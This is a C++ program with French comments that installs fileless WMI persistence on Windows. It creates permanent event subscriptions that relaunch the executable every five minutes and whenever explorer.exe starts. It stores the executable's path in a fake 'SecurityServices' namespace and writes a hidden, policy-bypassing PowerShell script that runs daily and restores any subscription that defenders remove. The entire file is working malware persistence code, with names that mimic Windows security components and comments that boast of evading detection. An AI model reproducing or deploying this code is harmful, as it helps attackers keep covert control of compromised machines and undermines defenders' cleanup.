#include <iostream>
#include <fstream>
#include <string>
#include <vector>
#include <Windows.h>
#include <filesystem>

namespace fs = std::filesystem;

// Fonction pour obtenir le chemin de l'exécutable
std::string GetExecutablePath() {
    char buffer[MAX_PATH];
    GetModuleFileNameA(NULL, buffer, MAX_PATH);
    return std::string(buffer);
}

// Classe qui implémente la persistance WMI (Windows Management Instrumentation)
class WMIPersistence {
public:
    // Fonction pour établir une persistance via WMI (Windows Management Instrumentation)
    // Cette méthode est "fileless" et très difficile à détecter par les solutions de sécurité
    bool setupWMIPersistence() {
        std::cout << "[*] Configuration de la persistance WMI..." << std::endl;
        
        // Obtenir le chemin de l'exécutable pour le relancer
        std::string exePath = GetExecutablePath();
        if (exePath.empty()) {
            std::cout << "[!] Impossible d'obtenir le chemin de l'exécutable" << std::endl;
            return false;
        }
        
        // Échapper les backslashes pour PowerShell
        std::string escapedPath = exePath;
        size_t pos = 0;
        while ((pos = escapedPath.find("\\", pos)) != std::string::npos) {
            escapedPath.replace(pos, 1, "\\\\");
            pos += 2;
        }
        
        // 1. Créer un filtre d'événement permanent (déclencheur)
        // Ce filtre sera déclenché toutes les 5 minutes et au démarrage du système
        std::string createFilterCmd = "powershell -Command \"$Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'}\"";
        
        // 2. Créer un consommateur de commande qui exécutera notre programme
        std::string createConsumerCmd = "powershell -Command \"$Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='WindowsSecurityConsumer'; CommandLineTemplate='" + escapedPath + "'; RunInteractively='false'}\"";
        
        // 3. Créer une liaison entre le filtre et le consommateur (le déclencheur et l'action)
        std::string createBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsSecurityFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // 4. Créer un second abonnement pour le démarrage du système
        std::string createBootFilterCmd = "powershell -Command \"$BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='WindowsBootFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \\\"explorer.exe\\\"'}\"";
        
        std::string createBootBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='WindowsBootFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='WindowsSecurityConsumer'\\\"); DeliveryQoS=1}\"";
        
        // 5. Implémenter des méthodes avancées de persistance WMI
        
        // 5.1 Créer une classe WMI personnalisée permanente pour stocker des données
        std::string createClassCmd = "powershell -Command \"$Namespace = 'root\\SecurityServices'; if (-not (Get-WmiObject -Namespace 'root' -Class __NAMESPACE -Filter \\\"Name='SecurityServices'\\\")) { $NewNamespace = New-Object System.Management.ManagementClass('root', $null, $null); $NewNamespace.Name = 'SecurityServices'; $NewNamespace.Put() }; $BasePath = ([WmiClass] 'root\\SecurityServices:Win32_SecurityProvider').Path.Path; if (-not $BasePath) { $NewClass = New-Object System.Management.ManagementClass('root\\SecurityServices', [string]::Empty, $null); $NewClass['__CLASS'] = 'Win32_SecurityProvider'; $NewClass.Qualifiers.Add('Static', $true); $NewClass.Properties.Add('ID', [System.Management.CimType]::String, $false); $NewClass.Properties['ID'].Qualifiers.Add('Key', $true); $NewClass.Properties.Add('Library', [System.Management.CimType]::String, $false); $NewClass.Properties.Add('Status', [System.Management.CimType]::UInt32, $false); $NewClass.Put() }\"";
        
        // 5.2 Stocker le chemin de l'exécutable dans cette classe personnalisée pour persistance secondaire
        std::string storeDataCmd = "powershell -Command \"$ClassName = 'Win32_SecurityProvider'; $WmiInstance = Set-WmiInstance -Namespace 'root\\SecurityServices' -Class $ClassName -Arguments @{ID='SecurityManager'; Library='" + escapedPath + "'; Status=1}\"";
        
        // 5.3 Créer un script PowerShell pour la restauration de la persistance si elle est supprimée
        std::string tempDir = std::string(getenv("TEMP"));
        std::string wmiRestorePath = tempDir + "\\SecurityServices.ps1";
        std::ofstream wmiRestoreScript(wmiRestorePath);
        
        if (wmiRestoreScript.is_open()) {
            wmiRestoreScript << "$LibraryPath = (Get-WmiObject -Namespace 'root\\SecurityServices' -Class Win32_SecurityProvider -Filter \"ID='SecurityManager'\").Library" << std::endl;
            wmiRestoreScript << "# Vérifier si les filtres WMI existent, sinon les recréer" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le filtre principal" << std::endl;
            wmiRestoreScript << "    $Filter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsSecurityFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM __InstanceModificationEvent WITHIN 300 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour % 1 = 0'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le consommateur" << std::endl;
            wmiRestoreScript << "    $Command = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsSecurityConsumer';" << std::endl;
            wmiRestoreScript << "        CommandLineTemplate=$LibraryPath;" << std::endl;
            wmiRestoreScript << "        RunInteractively='false'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "# Recréer les liaisons si nécessaires" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -Filter \"Filter.Name='WindowsSecurityFilter' AND Consumer.Name='WindowsSecurityConsumer'\")) {" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsSecurityFilter'\");" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "# Vérifier le filtre de démarrage" << std::endl;
            wmiRestoreScript << "if (-not (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\")) {" << std::endl;
            wmiRestoreScript << "    # Recréer le filtre de démarrage" << std::endl;
            wmiRestoreScript << "    $BootFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Name='WindowsBootFilter';" << std::endl;
            wmiRestoreScript << "        EventNameSpace='root\\cimv2';" << std::endl;
            wmiRestoreScript << "        QueryLanguage='WQL';" << std::endl;
            wmiRestoreScript << "        Query='SELECT * FROM Win32_ProcessStartTrace WHERE ProcessName = \"explorer.exe\"'" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "    # Recréer la liaison de démarrage" << std::endl;
            wmiRestoreScript << "    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{" << std::endl;
            wmiRestoreScript << "        Filter = (Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \"Name='WindowsBootFilter'\");" << std::endl;
            wmiRestoreScript << "        Consumer = (Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \"Name='WindowsSecurityConsumer'\");" << std::endl;
            wmiRestoreScript << "        DeliveryQoS = 1" << std::endl;
            wmiRestoreScript << "    }" << std::endl;
            wmiRestoreScript << "}" << std::endl;
            wmiRestoreScript << "# Exécuter notre programme principal immédiatement" << std::endl;
            wmiRestoreScript << "Start-Process -FilePath $LibraryPath -WindowStyle Hidden" << std::endl;
            wmiRestoreScript.close();
            
            // 5.4 Créer un WMI Event Consumer qui exécute ce script de restauration quotidiennement
            std::string createRestoreFilterCmd = "powershell -Command \"$RestoreFilter = Set-WmiInstance -Class __EventFilter -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerFilter'; EventNameSpace='root\\cimv2'; QueryLanguage='WQL'; Query='SELECT * FROM __InstanceModificationEvent WITHIN 86400 WHERE TargetInstance ISA ''Win32_LocalTime'' AND TargetInstance.Hour = 3 AND TargetInstance.Minute = 0'}\"";
            
            std::string createRestoreConsumerCmd = "powershell -Command \"$RestoreConsumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace 'root\\subscription' -Arguments @{Name='SecurityManagerConsumer'; CommandLineTemplate='powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File " + wmiRestorePath + "'; RunInteractively='false'}\"";
            
            std::string createRestoreBindingCmd = "powershell -Command \"Set-WmiInstance -Class __FilterToConsumerBinding -Namespace 'root\\subscription' -Arguments @{Filter=(Get-WmiObject -Namespace 'root\\subscription' -Class __EventFilter -Filter \\\"Name='SecurityManagerFilter'\\\"); Consumer=(Get-WmiObject -Namespace 'root\\subscription' -Class CommandLineEventConsumer -Filter \\\"Name='SecurityManagerConsumer'\\\"); DeliveryQoS=1}\"";
            
            // Exécuter les commandes PowerShell avec la priorité élevée
            system(("powershell -Command \"Start-Process powershell -ArgumentList '-ExecutionPolicy Bypass -Command \"" + createClassCmd + "\"' -Verb RunAs -WindowStyle Hidden\"").c_str());
            Sleep(1000); // Attendre que le namespace soit créé
            
            system(createFilterCmd.c_str());
            system(createConsumerCmd.c_str());
            system(createBindingCmd.c_str());
            system(createBootFilterCmd.c_str());
            system(createBootBindingCmd.c_str());
            system(storeDataCmd.c_str());
            system(createRestoreFilterCmd.c_str());
            system(createRestoreConsumerCmd.c_str());
            system(createRestoreBindingCmd.c_str());
            
            // 6. Cacher nos traces en rendant le fichier script invisible
            system(("attrib +h +s \"" + wmiRestorePath + "\"").c_str());
            
            std::cout << "[+] Persistance WMI configurée avec succès!" << std::endl;
            return true;
        } else {
            std::cout << "[!] Échec de la création du script de restauration WMI" << std::endl;
            return false;
        }
    }
    
    // Fonction pour vérifier et réparer la persistance WMI (exécutée périodiquement)
    bool verifyAndRepairWMIPersistence() {
        // Vérifier si notre classe personnalisée WMI existe
        std::string checkClassCmd = "powershell -Command \"if (Get-WmiObject -Namespace 'root\\SecurityServices' -Class Win32_SecurityProvider -ErrorAction SilentlyContinue) { Write-Output 'exists' } else { Write-Output 'notexists' }\"";
        
        std::string tempFile = std::string(getenv("TEMP")) + "\\wmi_check.txt";
        system((checkClassCmd + " > " + tempFile).c_str());
        
        std::ifstream resultFile(tempFile);
        std::string result;
        std::getline(resultFile, result);
        resultFile.close();
        fs::remove(tempFile);
        
        if (result == "notexists") {
            std::cout << "[!] Persistance WMI compromise, restauration..." << std::endl;
            return setupWMIPersistence();
        }
        
        // Vérifier les filtres et liaisons WMI
        std::string checkBindingsCmd = "powershell -Command \"if ((Get-WmiObject -Namespace 'root\\subscription' -Class __FilterToConsumerBinding -ErrorAction SilentlyContinue | Where-Object {$_.Filter.Name -eq 'WindowsSecurityFilter'})) { Write-Output 'exists' } else { Write-Output 'notexists' }\"";
        
        system((checkBindingsCmd + " > " + tempFile).c_str());
        
        resultFile.open(tempFile);
        std::getline(resultFile, result);
        resultFile.close();
        fs::remove(tempFile);
        
        if (result == "notexists") {
            std::cout << "[!] Liaisons WMI compromises, restauration..." << std::endl;
            return setupWMIPersistence();
        }
        
        std::cout << "[+] Persistance WMI vérifiée et intacte" << std::endl;
        return true;
    }
};

// Fonction pour tester la persistance WMI
int main() {
    WMIPersistence wmiPersistence;
    
    // Configurer la persistance WMI
    if (wmiPersistence.setupWMIPersistence()) {
        std::cout << "[+] Configuration de la persistance WMI réussie!" << std::endl;
    } else {
        std::cout << "[!] Échec de la configuration de la persistance WMI." << std::endl;
        return 1;
    }
    
    // Vérifier que la persistance est bien en place
    if (wmiPersistence.verifyAndRepairWMIPersistence()) {
        std::cout << "[+] Vérification de la persistance WMI réussie!" << std::endl;
    } else {
        std::cout << "[!] Échec de la vérification de la persistance WMI." << std::endl;
        return 1;
    }
    
    return 0;
} 